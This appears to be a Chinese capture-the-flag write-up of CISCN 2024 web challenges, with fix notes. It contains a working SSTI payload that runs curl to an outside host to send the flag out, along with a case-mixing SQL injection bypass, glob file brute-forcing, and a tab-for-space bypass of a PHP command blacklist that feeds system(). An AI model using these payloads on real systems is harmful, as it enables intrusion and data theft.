---
title: CISCN 华东北 2024 比赛题解
contest: CISCN
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [狼组复盘, SSTI禁print, cycler.__globals__.__builtins__.__import__, flask render_template_string, python-2 db flag, php-1 后门注释, php-2 union seLEct大小写, php-3 glob协议爆破, d88554c739859dfe.php, sort%09/f* 12字符绕过]
attack_chain:
  - python-1 SSTI 禁 print: cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:8081/`sort /fl*`').read()
  - python-2: db 里就有 flag (非预期)
  - php-1: 后门 d 盾扫描 → 注释
  - php-2: union seLEct 大小写绕过 addslashes
  - php-3: glob:///var/www/html/d* 爆破 d88554c739859dfe.php
  - d88554c739859dfe.php 12 字符限制: sort%09/f* 绕 (空格 tab 替代)
  - blacklist: space/flag/cat/&&/||/%0a/less/more/%0d/|/& 替换空
  - sort%09 长度 9 < 12 字符
key_payload: 'cycler SSTI 禁 print / union seLEct 大小写 / glob 协议爆破 d88554c739859dfe / sort%09 12 字符限制 / %09 代替空格'
one_liner: CISCN 华东北 2024 狼组复盘 — SSTI 禁 print 用 cycler.__globals__.__builtins__.__import__ 拿 os.popen + php-2 union seLEct 大小写 + php-3 glob 爆破 d88554c739859dfe + sort%09 12 字符限制读 /flag。
lesson: SSTI 沙箱常禁 print 但 __globals__.__builtins__.__import__ 仍可绕;SQL 大小写绕过 addslashes;glob 协议 + 字符爆破是文件发现经典法;sort%09 替代 sort+空格节省字符。
quality: medium
---

# CISCN 华东北 2024 比赛题解

## 速读
狼组 CISCN 华东北 2024 复盘 — python-1/2 + php-1/2/3。

## Web

### python-1 (SSTI)
```python
name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:8081/`sort /fl*`').read()%}
```
- 禁用 print, 用 cycler.next.__globals__.__builtins__.__import__('os') 绕
- 无回显, 拼接 `cu'+'rl` 绕过 curl 关键字
- 端口 8081 接收, sort /fl* 列 flag

### python-2 (非预期)
- db 里直接有 flag
- 修复: 注释 SQL 注入

### php-1
- 后门用 d 盾扫描 → 注释

### php-2
- `/var/www/html/action/adminuser/searchmodify.php` 注入
- 大小写绕过: `Union seLEct` 绕 addslashes
- 修复: 加转义函数

### php-3
- glob 协议爆破文件
- `http://192.64.1.149/?path=glob:///var/www/html/d*`
- 拿到 d88554c739859dfe.php

```php
<?php
$substitutions = array(
    ' ' => '', 'flag' => '', 'cat' => '', '&&' => '', '||' => '',
    '%0a' => '', 'less' => '', 'more' => '', '%0d' => '', '|' => '', '&' => ''
);
$cmd = str_replace(array_keys($substitutions), $substitutions, $content);
if(strlen($cmd) > 12) echo "Not very good";
else system($cmd);
```

- `sort%09/f*` 长度 9 < 12 → 读 flag (用 tab `%09` 代替空格, 节省 1 字符)
- 修复: 'flag' 替换成 '123' (而非空)
